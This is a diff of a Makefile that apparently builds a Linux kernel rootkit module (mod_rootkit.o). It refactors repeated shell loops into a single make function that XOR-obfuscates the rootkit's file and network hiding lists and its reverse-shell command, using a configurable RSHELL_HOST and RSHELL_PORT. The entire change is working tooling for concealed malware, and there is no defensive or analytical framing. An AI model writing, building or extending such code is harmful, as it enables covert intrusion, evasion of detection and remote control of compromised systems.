@@ -14,30 +14,24 @@ XOR_KEY := 0x5A
 RSHELL_HOST ?=
 RSHELL_PORT ?=
 
-
-# xor STRING_EXCLUDES
-STRING_EXCLUDES_OBF := $(shell \
-  STRING_EXCLUDES_STR="$(STRING_EXCLUDES)"; \
+# ======================================================= XOR DEFINITIONS START
+# define function to XOR a string character-by-character
+define xor_obfuscate
+$(shell \
+  STR="$1"; \
   i=1; \
-  while [ $$i -le $$(printf '%s' "$$STRING_EXCLUDES_STR" | wc -c) ]; do \
-    c=$$(printf '%s' "$$STRING_EXCLUDES_STR" | cut -b$$i); \
+  while [ $$i -le $$(printf '%s' "$$STR" | wc -c) ]; do \
+    c=$$(printf '%s' "$$STR" | cut -b$$i); \
     printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
     i=$$((i + 1)); \
   done; \
   echo "'\\x00'"; \
 )
+endef
 
-# xor NET_EXCLUDES
-NET_EXCLUDES_OBF := $(shell \
-  NET_EXCLUDES_STR="$(NET_EXCLUDES)"; \
-  i=1; \
-  while [ $$i -le $$(printf '%s' "$$NET_EXCLUDES_STR" | wc -c) ]; do \
-    c=$$(printf '%s' "$$NET_EXCLUDES_STR" | cut -b$$i); \
-    printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
-    i=$$((i + 1)); \
-  done; \
-  echo "'\\x00'"; \
-)
+# use function to obfuscate each string
+STRING_EXCLUDES_OBF := $(call xor_obfuscate,$(STRING_EXCLUDES))
+NET_EXCLUDES_OBF    := $(call xor_obfuscate,$(NET_EXCLUDES))
 
 # no need to define RSHELL_CMD if rshell host / port are empty
 ifneq ($(strip $(RSHELL_HOST)),)
@@ -50,17 +44,11 @@ else
   RSHELL_CMD :=
 endif
 
-# xor RSHELL_CMD
-RSHELL_CMD_OBF := $(shell \
-  RSHELL_STR="$(RSHELL_CMD)"; \
-  i=1; \
-  while [ $$i -le $$(printf '%s' "$$RSHELL_STR" | wc -c) ]; do \
-    c=$$(printf '%s' "$$RSHELL_STR" | cut -b$$i); \
-    printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
-    i=$$((i + 1)); \
-  done; \
-  echo "'\\x00'"; \
-)
+# obfuscate RSHELL_CMD
+RSHELL_CMD_OBF := $(call xor_obfuscate,$(RSHELL_CMD))
+
+# ======================================================= XOR DEFINITIONS END
+
 
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := src/mod_rootkit.o \
